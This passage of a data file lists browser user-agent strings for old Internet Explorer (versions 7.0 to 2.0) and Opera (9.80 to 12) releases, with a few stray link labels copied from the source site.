 "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; WOW64; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; c .NET CLR 3.0.04506; .NET CLR 3.5.30707; InfoPath.1; el-GR)",
 "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; c .NET CLR 3.0.04506; .NET CLR 3.5.30707; InfoPath.1; el-GR)",
 "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; fr-FR)",
 "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; en-US)",
 "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2; WOW64; .NET CLR 2.0.50727)",
 "Mozilla/5.0 (compatible; MSIE 7.0; Windows 98; SpamBlockerUtility 6.3.91; SpamBlockerUtility 6.2.91; .NET CLR 4.1.89;GB)",
 "Mozilla/4.79 [en] (compatible; MSIE 7.0; Windows NT 5.0; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)",
 "Mozilla/4.0 (Windows; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
 "Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)",
 "Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1)",
 "Mozilla/4.0 (compatible;MSIE 7.0;Windows NT 6.0)",
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; Win64; x64; Trident/6.0; .NET4.0E; .NET4.0C)",
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; SLCC2; .NET CLR 2.0.50727; InfoPath.3; .NET4.0C; .NET4.0E; .NET CLR 3.5.30729; .NET CLR 3.0.30729; MS-RTC LM 8)",
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MS-RTC LM 8; .NET4.0C; .NET4.0E; InfoPath.3)",
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)",
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; chromeframe/12.0.742.100)",
 "More Internet Explorer 7.0 user agents strings -->>",
 "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
 "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
 "Mozilla/4.0 (compatible; MSIE 6.01; Windows NT 6.0)",
 "Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1; DigExt)",
 "Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1)",
 "Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; YComp 5.0.2.6)",
 "Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; YComp 5.0.0.0) (Compatible;  ;  ; Trident/4.0)",
 "Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; YComp 5.0.0.0)",
 "Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; .NET CLR 1.1.4322)",
 "Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0)",
 "Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 4.0; .NET CLR 1.0.2914)",
 "Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 4.0)",
 "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98; YComp 5.0.0.0)",
 "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98; Win 9x 4.90)",
 "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
 " Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1)",
 " Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; .NET CLR 1.0.3705)",
 " Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 4.0)",
 "Mozilla/5.0 (Windows; U; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
 "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
 "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4325)",
 "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)",
 "Mozilla/45.0 (compatible; MSIE 6.0; Windows NT 5.1)",
 "Mozilla/4.08 (compatible; MSIE 6.0; Windows NT 5.1)",
 "Mozilla/4.01 (compatible; MSIE 6.0; Windows NT 5.1)",
 "Mozilla/4.0 (X11; MSIE 6.0; i686; .NET CLR 1.1.4322; .NET CLR 2.0.50727; FDM)",
 "Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 6.0)",
 "Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 5.2)",
 "Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 5.0)",
 "Mozilla/4.0 (Windows;  MSIE 6.0;  Windows NT 5.1;  SV1; .NET CLR 2.0.50727)",
 "Mozilla/4.0 (MSIE 6.0; Windows NT 5.1)",
 "Mozilla/4.0 (MSIE 6.0; Windows NT 5.0)",
 "Mozilla/4.0 (compatible;MSIE 6.0;Windows 98;Q312461)",
 "Mozilla/4.0 (Compatible; Windows NT 5.1; MSIE 6.0) (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
 "Mozilla/4.0 (compatible; U; MSIE 6.0; Windows NT 5.1) (Compatible;  ;  ; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
 "Mozilla/4.0 (compatible; U; MSIE 6.0; Windows NT 5.1)",
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; InfoPath.3; Tablet PC 2.0)",
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB6.5; QQDownload 534; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; SLCC2; .NET CLR 2.0.50727; Media Center PC 6.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
 "More Internet Explorer 6.0 user agents strings -->>",
 "Mozilla/4.0 (compatible; MSIE 5.5b1; Mac_PowerPC)",
 "Mozilla/4.0 (compatible; MSIE 5.50; Windows NT; SiteKiosk 4.9; SiteCoach 1.0)",
 "Mozilla/4.0 (compatible; MSIE 5.50; Windows NT; SiteKiosk 4.8; SiteCoach 1.0)",
 "Mozilla/4.0 (compatible; MSIE 5.50; Windows NT; SiteKiosk 4.8)",
 "Mozilla/4.0 (compatible; MSIE 5.50; Windows 98; SiteKiosk 4.8)",
 "Mozilla/4.0 (compatible; MSIE 5.50; Windows 95; SiteKiosk 4.8)",
 "Mozilla/4.0 (compatible;MSIE 5.5; Windows 98)",
 "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1)",
 "Mozilla/4.0 (compatible; MSIE 5.5;)",
 "Mozilla/4.0 (Compatible; MSIE 5.5; Windows NT5.0; Q312461; SV1; .NET CLR 1.1.4322; InfoPath.2)",
 "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT5)",
 "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)",
 "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
 "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 6.1; chromeframe/12.0.742.100; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C)",
 "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30618)",
 "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.5)",
 "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.2; .NET CLR 1.1.4322; InfoPath.2; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; FDM)",
 "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.2; .NET CLR 1.1.4322) (Compatible;  ;  ; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
 "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.2; .NET CLR 1.1.4322)",
 "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
 "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
 "More Internet Explorer 5.5 user agents strings -->>",
 "Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)",
 "Mozilla/4.0 (compatible; MSIE 5.22; Mac_PowerPC)",
 "Mozilla/4.0 (compatible; MSIE 5.21; Mac_PowerPC)",
 "Mozilla/4.0 (compatible; MSIE 5.2; Mac_PowerPC)",
 " Mozilla/4.0 (compatible; MSIE 5.2; Mac_PowerPC)",
 "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)",
 "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC Mac OS; en)",
 "Mozilla/4.0 (compatible; MSIE 5.16; Mac_PowerPC)",
 " Mozilla/4.0 (compatible; MSIE 5.16; Mac_PowerPC)",
 "Mozilla/4.0 (compatible; MSIE 5.15; Mac_PowerPC)",
 " Mozilla/4.0 (compatible; MSIE 5.15; Mac_PowerPC)",
 "Mozilla/4.0 (compatible; MSIE 5.14; Mac_PowerPC)",
 "Mozilla/4.0 (compatible; MSIE 5.13; Mac_PowerPC)",
 "Mozilla/4.0 (compatible; MSIE 5.12; Mac_PowerPC)",
 " Mozilla/4.0 (compatible; MSIE 5.12; Mac_PowerPC)",
 "Mozilla/4.0 (compatible; MSIE 5.05; Windows NT 4.0)",
 "Mozilla/4.0 (compatible; MSIE 5.05; Windows NT 3.51)",
 "Mozilla/4.0 (compatible; MSIE 5.05; Windows 98; .NET CLR 1.1.4322)",
 "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT; YComp 5.0.0.0)",
 "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT; Hotbar 4.1.8.0)",
 "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT; DigExt)",
 "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT; .NET CLR 1.0.3705)",
 "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT)",
 "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.6; MSIECrawler)",
 "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.6; Hotbar 4.2.8.0)",
 "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.6; Hotbar 3.0)",
 "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.6)",
 "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.4)",
 "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.0.0; Hotbar 4.1.8.0)",
 "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.0.0)",
 "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Wanadoo 5.6)",
 "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Wanadoo 5.3; Wanadoo 5.5)",
 "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Wanadoo 5.1)",
 "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; SV1; .NET CLR 1.1.4322; .NET CLR 1.0.3705; .NET CLR 2.0.50727)",
 "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; SV1)",
 "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Q312461; T312461)",
 "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Q312461)",
 "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; MSIECrawler)",
 "More Internet Explorer 5.01 user agents strings -->>",
 "Mozilla/4.0 (compatible; MSIE 5.0b1; Mac_PowerPC)",
 "Mozilla/4.0 (compatible; MSIE 5.00; Windows 98)",
 "Mozilla/4.0(compatible; MSIE 5.0; Windows 98; DigExt)",
 "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT;)",
 "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; YComp 5.0.2.6)",
 "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; YComp 5.0.2.5)",
 "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; YComp 5.0.0.0)",
 "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; Hotbar 4.1.8.0)",
 "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; Hotbar 3.0)",
 "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; .NET CLR 1.0.3705)",
 "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt)",
 "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT)",
 "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 6.0; Trident/4.0; InfoPath.1; SV1; .NET CLR 3.0.04506.648; .NET4.0C; .NET4.0E)",
 "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 5.9; .NET CLR 1.1.4322)",
 "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 5.2; .NET CLR 1.1.4322)",
 "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 5.0)",
 "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98;)",
 "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; YComp 5.0.2.4)",
 "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; Hotbar 3.0)",
 "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt; YComp 5.0.2.6; yplus 1.0)",
 "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt; YComp 5.0.2.6)",
 "More Internet Explorer 5.0 user agents strings -->>",
 "Mozilla/4.0 (compatible; MSIE 4.5; Windows NT 5.1; .NET CLR 2.0.40607)",
 "Mozilla/4.0 (compatible; MSIE 4.5; Windows 98; )",
 "Mozilla/4.0 (compatible; MSIE 4.5; Mac_PowerPC)",
 " Mozilla/4.0 (compatible; MSIE 4.5; Mac_PowerPC)",
 "Mozilla/4.0 PPC (compatible; MSIE 4.01; Windows CE; PPC; 240x320; Sprint:PPC-6700; PPC; 240x320)",
 "Mozilla/4.0 (compatible; MSIE 4.01; Windows NT)",
 "Mozilla/4.0 (compatible; MSIE 4.01; Windows NT 5.0)",
 "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint;PPC-i830; PPC; 240x320)",
 "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint; SCH-i830; PPC; 240x320)",
 "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint:SPH-ip830w; PPC; 240x320)",
 "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint:SPH-ip320; Smartphone; 176x220)",
 "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint:SCH-i830; PPC; 240x320)",
 "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint:SCH-i320; Smartphone; 176x220)",
 "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint:PPC-i830; PPC; 240x320)",
 "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone; 176x220)",
 "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320; Sprint:PPC-6700; PPC; 240x320)",
 "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320; PPC)",
 "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC)",
 "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE)",
 "Mozilla/4.0 (compatible; MSIE 4.01; Windows 98; Hotbar 3.0)",
 "Mozilla/4.0 (compatible; MSIE 4.01; Windows 98; DigExt)",
 "Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)",
 "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)",
 "Mozilla/4.0 (compatible; MSIE 4.01; Mac_PowerPC)",
 "More Internet Explorer 4.01 user agents strings -->>",
 "Mozilla/4.0 WebTV/2.6 (compatible; MSIE 4.0)",
 "Mozilla/4.0 (compatible; MSIE 4.0; Windows NT)",
 "Mozilla/4.0 (compatible; MSIE 4.0; Windows 98 )",
 "Mozilla/4.0 (compatible; MSIE 4.0; Windows 95; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
 "Mozilla/4.0 (compatible; MSIE 4.0; Windows 95)",
 "Mozilla/4.0 (Compatible; MSIE 4.0)",
 "Mozilla/2.0 (compatible; MSIE 4.0; Windows 98)",
 "Mozilla/2.0 (compatible; MSIE 3.03; Windows 3.1)",
 "Mozilla/2.0 (compatible; MSIE 3.02; Windows 3.1)",
 "Mozilla/2.0 (compatible; MSIE 3.01; Windows 95)",
 " Mozilla/2.0 (compatible; MSIE 3.01; Windows 95)",
 "Mozilla/2.0 (compatible; MSIE 3.0B; Windows NT)",
 "Mozilla/3.0 (compatible; MSIE 3.0; Windows NT 5.0)",
 "Mozilla/2.0 (compatible; MSIE 3.0; Windows 95)",
 "Mozilla/2.0 (compatible; MSIE 3.0; Windows 3.1)",
 "Mozilla/4.0 (compatible; MSIE 2.0; Windows NT 5.0; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)",
 "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)",
 "Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)",
 "Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
 "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
 "Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
 "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
 "Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
 "Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
 "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00",
 "Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00",
 "Opera/12.0(Windows NT 5.1;U;en)Presto/22.9.168 Version/12.00",
 "Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/14.0 Opera/12.0",
 "Opera/9.80 (Windows NT 6.1; WOW64; U; pt) Presto/2.10.229 Version/11.62",
 "Opera/9.80 (Windows NT 6.0; U; pl) Presto/2.10.229 Version/11.62",
 "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
 "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; de) Presto/2.9.168 Version/11.52",
 "Opera/9.80 (Windows NT 5.1; U; en) Presto/2.9.168 Version/11.51",
 "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; de) Opera 11.51",
 "Opera/9.80 (X11; Linux x86_64; U; fr) Presto/2.9.168 Version/11.50",
 "Opera/9.80 (X11; Linux i686; U; hu) Presto/2.9.168 Version/11.50",
 "Opera/9.80 (X11; Linux i686; U; ru) Presto/2.8.131 Version/11.11",
 "Opera/9.80 (X11; Linux i686; U; es-ES) Presto/2.8.131 Version/11.11",
 "Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.1) Gecko/20061208 Firefox/5.0 Opera 11.11",
 "Opera/9.80 (X11; Linux x86_64; U; bg) Presto/2.8.131 Version/11.10",
 "Opera/9.80 (Windows NT 6.0; U; en) Presto/2.8.99 Version/11.10",
 "Opera/9.80 (Windows NT 5.1; U; zh-tw) Presto/2.8.131 Version/11.10",
 "Opera/9.80 (Windows NT 6.1; Opera Tablet/15165; U; en) Presto/2.8.149 Version/11.1",
 "Opera/9.80 (X11; Linux x86_64; U; Ubuntu/10.10 (maverick); pl) Presto/2.7.62 Version/11.01",
 "Opera/9.80 (X11; Linux i686; U; ja) Presto/2.7.62 Version/11.01",
 "Opera/9.80 (X11; Linux i686; U; fr) Presto/2.7.62 Version/11.01",
 "Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.7.62 Version/11.01",
 "Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.7.62 Version/11.01",
 "Opera/9.80 (Windows NT 6.1; U; sv) Presto/2.7.62 Version/11.01",
 "Opera/9.80 (Windows NT 6.1; U; en-US) Presto/2.7.62 Version/11.01",
 "Opera/9.80 (Windows NT 6.1; U; cs) Presto/2.7.62 Version/11.01",
 "Opera/9.80 (Windows NT 6.0; U; pl) Presto/2.7.62 Version/11.01",
 "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.7.62 Version/11.01",
 "Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01",
 "Opera/9.80 (Windows NT 5.1; U; cs) Presto/2.7.62 Version/11.01",
 "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.13) Gecko/20101213 Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.7.62 Vers",
 "Mozilla/5.0 (Windows NT 6.1; U; nl; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.01",
 "Mozilla/5.0 (Windows NT 6.1; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.01",
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01",
 "Opera/9.80 (X11; Linux x86_64; U; pl) Presto/2.7.62 Version/11.00",
 "Opera/9.80 (X11; Linux i686; U; it) Presto/2.7.62 Version/11.00",
 "Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.6.37 Version/11.00",
 "Opera/9.80 (Windows NT 6.1; U; pl) Presto/2.7.62 Version/11.00",
 "Opera/9.80 (Windows NT 6.1; U; ko) Presto/2.7.62 Version/11.00",
 "Opera/9.80 (Windows NT 6.1; U; fi) Presto/2.7.62 Version/11.00",
 "Opera/9.80 (Windows NT 6.1; U; en-GB) Presto/2.7.62 Version/11.00",
 "Opera/9.80 (Windows NT 6.1 x64; U; en) Presto/2.7.62 Version/11.00",
 "Opera/9.80 (Windows NT 6.0; U; en) Presto/2.7.39 Version/11.00",
 "Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.7.39 Version/11.00",
 "Opera/9.80 (Windows NT 5.1; U; MRA 5.5 (build 02842); ru) Presto/2.7.62 Version/11.00",
 "Opera/9.80 (Windows NT 5.1; U; it) Presto/2.7.62 Version/11.00",
 "Mozilla/5.0 (Windows NT 6.0; U; ja; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00",
 "Mozilla/5.0 (Windows NT 5.1; U; pl; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00",
 "Mozilla/5.0 (Windows NT 5.1; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00",
 "Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00",
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00",
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00",
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00",
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00",
 "Opera/9.80 (Windows NT 6.1; U; pl) Presto/2.6.31 Version/10.70",
 "Mozilla/5.0 (Windows NT 5.2; U; ru; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.70",
 "Mozilla/5.0 (Windows NT 5.1; U; zh-cn; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.70",
 "Opera/9.80 (Windows NT 5.2; U; zh-cn) Presto/2.6.30 Version/10.63",
 "Opera/9.80 (Windows NT 5.2; U; en) Presto/2.6.30 Version/10.63",
 "Opera/9.80 (Windows NT 5.1; U; MRA 5.6 (build 03278); ru) Presto/2.6.30 Version/10.63",
 "Opera/9.80 (Windows NT 5.1; U; pl) Presto/2.6.30 Version/10.62",
 "Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62",
 "Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; de) Opera 10.62",
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; en) Opera 10.62",
 "Opera/9.80 (X11; Linux i686; U; pl) Presto/2.6.30 Version/10.61",
 "Opera/9.80 (X11; Linux i686; U; es-ES) Presto/2.6.30 Version/10.61",
 "Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.6.30 Version/10.61",
 "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.6.30 Version/10.61",
 "Opera/9.80 (Windows NT 6.0; U; it) Presto/2.6.30 Version/10.61",
 "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.6.30 Version/10.61",
 "Opera/9.80 (Windows 98; U; de) Presto/2.6.30 Version/10.61",
 "Opera/9.80 (Macintosh; Intel Mac OS X; U; nl) Presto/2.6.30 Version/10.61",
 "Opera/9.80 (X11; Linux i686; U; en) Presto/2.5.27 Version/10.60",
 "Opera/9.80 (Windows NT 6.0; U; nl) Presto/2.6.30 Version/10.60",
 "Opera/10.60 (Windows NT 5.1; U; zh-cn) Presto/2.6.30 Version/10.60",
 "Opera/10.60 (Windows NT 5.1; U; en-US) Presto/2.6.30 Version/10.60",
 "Opera/9.80 (X11; Linux i686; U; it) Presto/2.5.24 Version/10.54",
 "Opera/9.80 (X11; Linux i686; U; en-GB) Presto/2.5.24 Version/10.53",
 "Mozilla/5.0 (Windows NT 5.1; U; zh-cn; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.53",
 "Mozilla/5.0 (Windows NT 5.1; U; Firefox/5.0; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.53",
 "Mozilla/5.0 (Windows NT 5.1; U; Firefox/4.5; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.53",
 "Mozilla/5.0 (Windows NT 5.1; U; Firefox/3.5; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.53",
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; ko) Opera 10.53",
 "Opera/9.80 (Windows NT 6.1; U; fr) Presto/2.5.24 Version/10.52",
 "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.5.22 Version/10.51",
 "Opera/9.80 (Windows NT 6.0; U; cs) Presto/2.5.22 Version/10.51",
 "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
 "Opera/9.80 (Linux i686; U; en) Presto/2.5.22 Version/10.51",
 "Mozilla/5.0 (Windows NT 6.1; U; en-GB; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.51",
 "Mozilla/5.0 (Linux i686; U; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.51",
 "Mozilla/4.0 (compatible; MSIE 8.0; Linux i686; en) Opera 10.51",
 "Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.5.22 Version/10.50",
 "Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.5.22 Version/10.50",
 "Opera/9.80 (Windows NT 6.1; U; sk) Presto/2.6.22 Version/10.50",
 "Opera/9.80 (Windows NT 6.1; U; ja) Presto/2.5.22 Version/10.50",
 "Opera/9.80 (Windows NT 6.0; U; zh-cn) Presto/2.5.22 Version/10.50",
 "Opera/9.80 (Windows NT 5.1; U; sk) Presto/2.5.22 Version/10.50",
 "Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.5.22 Version/10.50",
 "Opera/10.50 (Windows NT 6.1; U; en-GB) Presto/2.2.2",
 "Opera/9.80 (S60; SymbOS; Opera Tablet/9174; U; en) Presto/2.7.81 Version/10.5",
 "Opera/9.80 (X11; U; Linux i686; en-US; rv:1.9.2.3) Presto/2.2.15 Version/10.10",
 "Opera/9.80 (X11; Linux x86_64; U; it) Presto/2.2.15 Version/10.10",
